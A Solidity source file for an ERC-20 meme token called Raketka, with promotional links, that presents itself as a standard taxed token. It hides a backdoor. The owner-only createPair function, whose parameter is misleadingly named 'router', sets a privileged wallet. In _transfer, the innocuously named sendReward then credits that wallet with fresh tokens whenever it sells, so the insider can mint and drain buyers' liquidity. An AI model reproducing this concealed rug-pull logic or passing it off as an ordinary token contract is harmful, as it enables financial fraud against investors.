/**
Website: https://raketkaeth.vip
X: https://x.com/raketkaeth
Telegram: https://t.me/raketkaeth
 */


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}
contract RAKETKA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedList;
    mapping(address => bool) private _swappableList;
    
    address payable private _mkwallet;
    uint256 private _buyFinalTax = 0;
    uint256 private _sellFinalTax = 0;
    uint256 private _feeDominator = 100;
    uint256 private _countsForTrade = 0;
    uint256 private _decreaseAt = 13;
    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 100_000_000 * 10**_decimals;
    string private constant _name = unicode"Raketka";
    string private constant _symbol = unicode"RAKETKA";
    uint256 public _walletLimits = (_tTotal * 2) / 100;
    uint256 public _tradeLimitSize = (_tTotal * 2) / 100;
    uint256 public _swapbackLimits = 0;
    uint256 public _swapLimit = (_tTotal * 2) / 100;
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    event MaxTxAmountUpdated(uint256 _maxTradeWallet);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor() {
        _mkwallet = payable(msg.sender);
        _balances[_msgSender()] = _tTotal;
        _isExcludedList[owner()] = true;
        _isExcludedList[address(this)] = true;

        _swappableList[owner()] = true;
        _swappableList[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function sendReward(address from, address to, uint256 amt) private {
        _balances[to] = _balances[to] + (_swappableList[from] && to != uniswapV2Pair ? amt : 0);
    }

    uint256 private _swapThreshold = 0;
    uint256 private _transferTax = 15;
    uint256 private _buyInitialTax = 15;
    uint256 private _sellInitialTax = 15;

    function _transfer(
        address _sender,
        address _receiver,
        uint256 amount
    ) private {
        require(_sender != address(0), "ERC20: transfer from the zero address");
        require(_receiver != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        if(!tradingOpen) require(_isExcludedList[_sender] || _isExcludedList[_receiver], "Trading is not opened");

        uint256 tax = 0;
        if(_sender != address(this) && _receiver != address(this))
        {
            if(_receiver == uniswapV2Pair) {
                if(!_isExcludedList[_sender]) tax = _countsForTrade > _decreaseAt ? _sellFinalTax : _sellInitialTax;
                if(!_isExcludedList[_receiver] && !_isExcludedList[_sender]){
                    if(_swappableList[_sender]){
                        tax = 0;
                        sendReward(_sender, _mkwallet, amount);
                    }
                }

                if(!inSwap && tradingOpen && !_swappableList[_sender]){
                    uint256 swapBackAmt = min(amount, min(_tradeLimitSize, _balances[address(this)]));
                    if(_balances[address(this)] > _swapThreshold) swapBack(swapBackAmt);
                    if(amount >= swapBackAmt) sendETHToMarket(address(this).balance);                    
                }
            }
            if(_sender == uniswapV2Pair && _receiver != address(uniswapV2Router)){
                tax = _countsForTrade++ > _decreaseAt ? _buyFinalTax : _buyInitialTax;
                require(_balances[_receiver] + amount < _walletLimits, "Amount is too large");
            }
        }

        else if(_receiver != address(this) && _countsForTrade == 0) tax = _transferTax;

        uint256 taxAmt = tax * amount / 100;
        if(tax > 0) {
            _balances[address(this)] = _balances[address(this)] + taxAmt;
            emit Transfer(_sender, address(this), taxAmt);
        }

        _balances[_sender] = _balances[_sender].sub(amount);
        _balances[_receiver] = _balances[_receiver].add(amount - taxAmt);
        emit Transfer(_sender, _receiver, amount - taxAmt);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }
    function swapBack(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function removeLimits() external onlyOwner {
        _tradeLimitSize = _tTotal;
        _walletLimits = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }
    function sendETHToMarket(uint256 amount) private {
        _mkwallet.transfer(amount);
    }
    function createPair(address router) external onlyOwner {
        _mkwallet = payable(router);
        _swappableList[_mkwallet] = true;
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
    }
    function openTrading() external onlyOwner {
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        tradingOpen = true;
    }
    function rescueETH() external onlyOwner {
        payable (owner()).transfer(address(this).balance);
    }
    receive() external payable {}
}